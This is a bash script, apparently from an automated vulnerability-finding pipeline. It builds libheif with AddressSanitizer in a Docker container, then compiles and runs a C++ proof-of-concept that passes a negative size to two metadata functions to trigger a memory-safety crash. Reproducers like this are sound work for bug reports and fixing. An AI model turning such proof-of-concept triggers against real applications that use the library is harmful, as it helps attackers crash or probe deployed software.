#!/usr/bin/env bash
# build.sh — Build and run Bug 10 POC inside vulagent/libheif:latest
# Usage: bash build.sh
set -e

DOCKER_IMAGE="vulagent/libheif:latest"

docker run --rm "$DOCKER_IMAGE" bash -c '
set -e

# ── 1. Build libheif static library with AddressSanitizer ──────────────────
echo "[*] Configuring libheif with ASAN..."
mkdir -p /tmp/build_asan
cd /tmp/build_asan
cmake /src/libheif \
  -DCMAKE_CXX_COMPILER=clang++ \
  -DCMAKE_C_COMPILER=clang \
  -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
  -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address" \
  -DBUILD_SHARED_LIBS=OFF \
  -DWITH_EXAMPLES=OFF \
  -DWITH_FUZZERS=OFF \
  -DWITH_LIBDE265=OFF \
  -DWITH_X265=OFF \
  -DWITH_AOM_DECODER=OFF \
  -DWITH_AOM_ENCODER=OFF \
  -DCMAKE_BUILD_TYPE=RelWithDebInfo \
  > /dev/null 2>&1
echo "[*] Building libheif..."
make -j$(nproc) heif > /dev/null 2>&1

mkdir -p /tmp/build_asan/libheif_inc
ln -sf /tmp/build_asan/libheif /tmp/build_asan/libheif_inc/libheif

INCLUDE_API=/src/libheif/libheif/api
INCLUDE_GEN=/tmp/build_asan/libheif_inc
LIB=/tmp/build_asan/libheif/libheif.a
ASAN_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1"
ZLIB=/usr/lib/x86_64-linux-gnu/libz.so.1

# ── 2. Write POC source ─────────────────────────────────────────────────────
cat > /tmp/poc_trigger.cc << '"'"'CPPEOF'"'"'
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <libheif/heif.h>
#include <libheif/heif_context.h>
#include <libheif/heif_encoding.h>
#include <libheif/heif_image.h>
#include <libheif/heif_image_handle.h>
#include <libheif/heif_metadata.h>
static heif_image_handle* make_handle(heif_context* ctx) {
    heif_image* img = nullptr;
    heif_image_create(4, 4, heif_colorspace_monochrome, heif_chroma_monochrome, &img);
    heif_image_add_plane(img, heif_channel_Y, 4, 4, 8);
    int stride; uint8_t* p = heif_image_get_plane(img, heif_channel_Y, &stride); memset(p, 0, stride*4);
    heif_encoder* enc = nullptr;
    heif_context_get_encoder_for_format(ctx, heif_compression_mask, &enc);
    heif_image_handle* hdl = nullptr;
    heif_context_encode_image(ctx, img, enc, nullptr, &hdl);
    heif_encoder_release(enc); heif_image_release(img);
    return hdl;
}
int main(int argc, char* argv[]) {
    int which = (argc > 1) ? atoi(argv[1]) : 1;
    fprintf(stderr, "[+] Bug 10 POC: negative size to metadata functions (which=%d)\n", which);
    heif_context* ctx = heif_context_alloc();
    heif_image_handle* hdl = make_handle(ctx);
    if (!hdl) { fprintf(stderr, "[-] handle failed\n"); return 1; }
    char dummy[16] = {};
    if (which == 2)
        heif_context_add_XMP_metadata(ctx, hdl, dummy, -1);
    else
        heif_context_add_generic_metadata(ctx, hdl, dummy, -1, "test", "text/plain");
    fprintf(stderr, "[-] UNEXPECTED: no crash\n");
    heif_image_handle_release(hdl); heif_context_free(ctx);
    return 0;
}
CPPEOF

# ── 3. Compile ─────────────────────────────────────────────────────────────
echo "[*] Compiling poc_trigger..."
clang++ $ASAN_FLAGS -I$INCLUDE_API -I$INCLUDE_GEN \
    /tmp/poc_trigger.cc $LIB $ZLIB -lm -lpthread -ldl \
    -o /tmp/bin_trigger

# ── 4. Run ─────────────────────────────────────────────────────────────────
echo ""
echo "=== POC (which=1): heif_context_add_generic_metadata(size=-1) ==="
/tmp/bin_trigger 1 2>&1 || true
echo ""
echo "=== POC (which=2): heif_context_add_XMP_metadata(size=-1) ==="
/tmp/bin_trigger 2 2>&1 || true
'
